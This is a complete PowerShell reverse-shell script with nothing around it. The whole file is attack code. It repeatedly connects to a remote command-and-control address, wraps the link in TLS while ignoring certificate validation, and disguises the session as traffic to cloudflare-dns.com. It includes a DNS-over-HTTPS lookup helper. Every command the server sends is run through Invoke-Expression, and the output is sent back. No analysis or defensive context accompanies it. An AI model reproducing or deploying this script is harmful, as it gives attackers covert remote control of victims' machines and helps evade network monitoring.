function DNSLookup($DNSRecord){
    $response = (Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept' = 'application/dns-json'}).content
    return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
}

$remoteIP = "x.x.x.x"
$remotePort = "13337"

do {
    Start-Sleep -Seconds 1
    #c2 server connection attempt
    try{
        $TCPConnection = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
    }catch{}
} until ($TCPConnection.Connected)

#wrap the network stream with a secure encrypted communication channel
$NetworkStream = $TCPConnection.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($NetworkStream, $false, ({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $false)

#check whether the sslStream connection is established
if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
    $sslStream.Close()
    exit
}

#stream writer which will write utf8 based text directly to the ssl stream.
$streamWriter = New-Object System.IO.StreamWriter($sslStream)

function writeStreamToServer($string){
    # create buffer for the next network stream read. buffer size is the default size of the tcp client which is 65536 bytes.
    [byte[]]$script:buffer = 0..$TCPConnection.ReceiveBufferSize | % {0}
    $streamWriter.Write($string + 'SHELL '+(Get-Location).Path +' :>')
    $streamWriter.Flush()
}

writeStreamToServer ''

#read raw bytes by sslStream.read function which automatically decrypts them as part of the process
#save the bytes read count in $bytesRead
while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {

    #get the actual command string from raw bytes which are stored in buffer, ignoring the last new line byte
    $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)

    #execute command and save command output including errors for sending to the server
    $command_output = try {
        Invoke-Expression $command 2>&1 | Out-String
    }
    catch {
        $_ | Out-String
    }
    writeStreamToServer($command_output)
}

$streamWriter.Close()